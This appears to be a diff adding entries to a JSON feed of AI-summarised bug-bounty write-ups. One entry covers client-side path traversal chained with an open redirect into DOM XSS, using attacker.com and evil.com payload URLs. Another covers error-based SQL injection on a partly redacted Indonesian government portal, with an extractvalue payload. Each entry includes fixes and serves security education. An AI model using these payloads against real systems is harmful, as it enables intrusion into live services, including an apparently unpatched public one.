@@ -1,5 +1,47 @@
 [
   {
+    "id": "82b4ddcd0223",
+    "title": "From CSPT to DOM XSS: Chaining an Open Redirect with Malicious JSON",
+    "url": "https://medium.com/@AstroKrypTech/from-cspt-to-dom-xss-chaining-an-open-redirect-with-malicious-json-71a58c462c2a",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "AstroKrypTech"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-09T18:07:57.000Z",
+    "added_at": "2026-10-09T19:47:42.433Z",
+    "categories": [
+      "xss",
+      "access-control",
+      "other"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A client-side path traversal (CSPT) vulnerability allowed an attacker to manipulate an API request URL, redirecting it to a malicious server to inject a script into the page via DOM XSS.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The application takes a user-provided ID from the URL and appends it directly to an API path without sanitization. This allows path traversal (using ../ to change the folder). The application then takes the resulting data and puts it into the page using innerHTML, which doesn't block malicious code.",
+      "walkthrough": "RECON\n1. The researcher visits the profile page to see how it loads data.\nURL: https://target.example/profile?id=123\nWhy: To identify how the id parameter (a piece of data in the URL) affects the page.\nDISCOVERY\n2. The researcher inspects the site's code to find how the id is used.\nconst id = new URLSearchParams(location.search).get(\"id\");\nWhy: The code uses URLSearchParams (a tool to read URL data) to grab the id from location.search (the part of the URL after the question mark).\n3. The researcher finds where the id is sent to the server.\nfetch(`/api/user/${id}`)\nWhy: The fetch command (a request for data) builds a web address by sticking the id directly onto the end of the API path.\n4. The researcher looks for how the server's response is handled.\n.then(user => { displayUser(user); })\nWhy: The app takes the user data from the server and passes it to a function to show it on the screen.\n5. The researcher checks the displayUser function for dangerous code.\nelement.innerHTML = user.name;\nWhy: The app uses innerHTML (a tool that turns text into live HTML) which is dangerous because it executes any code found in the text.\nEXPLOITATION\n6. The researcher tests if they can change the folder the app looks in.\n?id=../test\nWhy: By using path traversal (using ../ to move up a folder), the researcher tries to make the app request a different endpoint (server address).\n7. The researcher finds an Open Redirect (a bug that sends users to any site) on the same server.\n/api/redirect?url=https://attacker.com\nWhy: This allows the researcher to point the app's data request to a server they control.\n8. The researcher creates a malicious JSON (a data format) file on their own server.\n{\"name\": \"<img src=x onerror=alert('XSS')>\"}\nWhy: This payload (malicious code) uses an image tag that fails to load, triggering a script to run.\n9. The researcher combines the traversal and the redirect into a single id value.\n?id=../../redirect?url=https://attacker.com/malicious.json\nWhy: This forces the fetch command to go up two folders, hit the redirector, and load the attacker's file.\n10. The researcher sends the final link to a victim.\nhttps://target.example/profile?id=../../redirect?url=https://attacker.com/malicious.json\nWhy: When the victim clicks, their browser performs the malicious request automatically.\nIMPACT\n11. The browser receives the attacker's JSON data.\n{\"name\": \"<img src=x onerror=alert('XSS')>\"}\nWhy: The browser thinks this is legitimate user data from the app's own server.\n12. The application injects the malicious name into the page.\nelement.innerHTML = \"<img src=x onerror=alert('XSS')>\";\nWhy: Because innerHTML was used, the browser sees the script and runs it, completing the XSS (Cross-Site Scripting) attack.",
+      "example": "A fictional site target.example uses a script to load user bios: const bioId = new URLSearchParams(window.location.search).get('bioId'); fetch('/api/bios/' + bioId).then(r => r.json()).then(data => { document.getElementById('bio-box').innerHTML = data.content; }); An attacker finds an open redirect at /api/go?to=EXTERNAL_URL. They host a file at https://evil.com/xss.json containing {\"content\": \"<script>alert('Hacked')</script>\"}. By tricking a user into visiting https://target.example/profile?bioId=../../go?to=https://evil.com/xss.json, the fetch call is diverted to the attacker's server. The browser receives the script and, because the site uses innerHTML, it executes the alert.",
+      "takeaway": "Look for fetch() or XMLHttpRequest where the URL is built using user input. Check if the site has an open redirect that can be reached via ../ traversal. Always check how the JSON response is rendered; if you see .innerHTML, .outerHTML, or $().html(), it is a prime target for XSS. A common mistake is assuming that because the data comes from an API, it is safe to trust. Variants include using this to bypass Content Security Policy (CSP) by loading scripts from a trusted domain's redirector.",
+      "fix": "First, use textContent instead of innerHTML to ensure data is treated as plain text, not code. Second, sanitize the input by removing ../ sequences or using a whitelist of allowed characters. \n\nconst id = new URLSearchParams(location.search).get(\"id\");\nif (!/^[a-zA-Z0-9]+$/.test(id)) return;\nfetch(`/api/user/${id}`)\n .then(res => res.json())\n .then(user => {\n   document.getElementById('name').textContent = user.name;\n });",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "A client-side path traversal vulnerability in the application’s profile-page loader allows an attacker to influence the URL used for a JSON API request. By supplying traversal sequences in a query parameter, the request can be redirected from the expected API endpoint to an open redirect. The redirect then points to an attacker-controlled JSON response. The application accepts that response as valid object data and inserts one array field into the DOM using `innerHTML`. This creates a DOM-based XSS condition. ## Affected Functionality The affected workflow is a public profile page that loads a",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "89ad0bc933f3",
     "title": "Error-Based SQL Injection di Portal Perizinan Pemerintah Kabupaten [REDACTED] via Parameter id",
     "url": "https://icikiwirsol.medium.com/error-based-sql-injection-di-portal-perizinan-pemerintah-kabupaten-redacted-via-parameter-id-ba1ec54b7c42",
@@ -35,6 +77,46 @@
       "fix_ar": null
     },
     "excerpt": "* **Jenis Kerentanan:** SQL Injection (Error-Based) * **Vektor:** Parameter URL (`id`) * **Dampak:** Eksekusi query SQL yang tidak sah, kebocoran informasi struktur database melalui pesan error, dan potensi eksfiltrasi data sensitif. * **Status:** Unfixed (Dilaporkan, belum ada balasan, belum diperbaiki) * **Severity:**Critical ## 2. Pendahuluan (Introduction) Halo, saya Primandito Adi Setiya, seorang _bug hunter_. Pada 14 November 2025, saya sedang melakukan _vulnerability testing_ pada portal layanan publik milik **Pemerintah Kabupaten [REDACTED]**. Saat menguji fitur persyaratan perizinan p",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
+    "id": "5f12e0c1b291",
+    "title": "Error-Based SQL Injection di Portal Berita Pemerintah kabupaten [REDACTED] via Parameter id_news",
+    "url": "https://icikiwirsol.medium.com/error-based-sql-injection-di-portal-berita-pemerintah-kabupaten-redacted-via-parameter-id-news-c655489968b3",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "Mencari si dia"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-09T11:08:26.000Z",
+    "added_at": "2026-10-09T19:55:46.700Z",
+    "categories": [
+      "sqli"
+    ],
+    "severity": "critical",
+    "difficulty": "beginner",
+    "summary_en": "An error-based SQL injection vulnerability was discovered in a government news portal's 'id_news' parameter, allowing attackers to view raw database errors and potentially extract sensitive information.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability stems from a lack of input sanitization (the process of cleaning data to remove dangerous characters) on the 'id_news' parameter. The application takes the value directly from the URL and inserts it into a SQL query (a command sent to a database to retrieve data) without using prepared statements. Because the application is configured to display raw database error messages to the user, any syntax error caused by malicious input is reflected on the screen. This specific flaw was found at the 'index.php' endpoint where the 'id_news' variable is processed.",
+      "walkthrough": "RECON\n1. The researcher identifies a news portal that uses a numerical ID in the URL to display specific articles.\nhttp://redacted.redactedkab.go.id/index.php?com=isi&id_news=290\nWhy: To find an entry point where user-supplied data (a parameter) is sent to the server's database (a system for storing organized information).\n\nDISCOVERY\n2. The researcher adds a single quote character to the end of the ID number in the URL.\nhttp://redacted.redactedkab.go.id/index.php?com=isi&id_news=290'\nWhy: A single quote (') is a special character used in SQL to wrap text; adding an extra one often breaks the query structure if the input isn't handled safely.\n\nEXPLOITATION\n3. The website responds with a raw error message from the database engine.\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''290'' at line 1\nWhy: This confirms Error-Based SQLi (a bug where the database leaks its internal errors), revealing that the server uses MariaDB and that the input is being directly interpreted as part of a command.\n\nIMPACT\n4. The researcher analyzes the error to confirm that the database structure can be mapped.\nN/A\nWhy: By seeing the 'syntax error' message, a professional knows they can now use more complex commands to force the database to reveal table names or user credentials through subsequent error messages.",
+      "example": "Imagine a fictional site 'target.example' that shows user profiles. The URL is 'target.example/profile.php?user_id=5'. The vulnerable code behind the scenes looks like this: 'SELECT * FROM users WHERE id = ' . $_GET['user_id']. If an attacker visits 'target.example/profile.php?user_id=5'', the database tries to run 'SELECT * FROM users WHERE id = 5'', which has an unbalanced quote. The database gets confused and sends back an error like 'Unexpected quote at line 1'. This tells the attacker the site is vulnerable. An attacker could then use a payload like '5 AND extractvalue(1,concat(0x7e,version()))' to force the database to show its version number inside an error message.",
+      "takeaway": "When hunting for bugs, always look for URL parameters that accept numbers, as these are frequently passed directly into database queries. Testing with a single quote (') or a backslash (\\) is the fastest way to trigger a visible error. If you see a database error message (like MariaDB, MySQL, or PostgreSQL errors), you have found a high-impact vulnerability. A common variant is 'Blind SQLi,' where the error isn't shown, but the page takes longer to load or looks different. A common mistake for beginners is assuming a site is safe just because it doesn't show a 'pretty' error; always check the page source for hidden error comments.",
+      "fix": "The most effective fix is using Prepared Statements (a security feature where the SQL command and the user data are sent to the database separately). This ensures the database treats the input strictly as data, not as executable code. Additionally, developers should disable public error reporting in production environments. \n\nExample of fixed PHP code:\n$id = $_GET['id_news'];\n$stmt = $pdo->prepare('SELECT * FROM news WHERE id = ?');\n$stmt->execute([$id]);\n$news = $stmt->fetch();",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "* **Jenis Kerentanan:** SQL Injection (Error-Based) * **Vektor:** Parameter URL (`id_news`) * **Dampak:** Eksekusi query SQL yang tidak sah, kebocoran informasi struktur database melalui pesan error, dan potensi eksfiltrasi data sensitif. * **Status:** Silent Fixed (Diperbaiki tanpa konfirmasi/balasan dari pihak terkait) * **Severity:**Critical ## 2. Pendahuluan (Introduction) Halo, saya Primandito Adi Setiya, seorang _bug hunter_. Pada 14 November 2025, saya sedang melakukan _vulnerability testing_ pada portal layanan publik milik **Pemerintah [REDACTED]**. Saat menguji fitur berita pada port",
     "ai_generated": true,
     "engagement": null,
     "score": 60
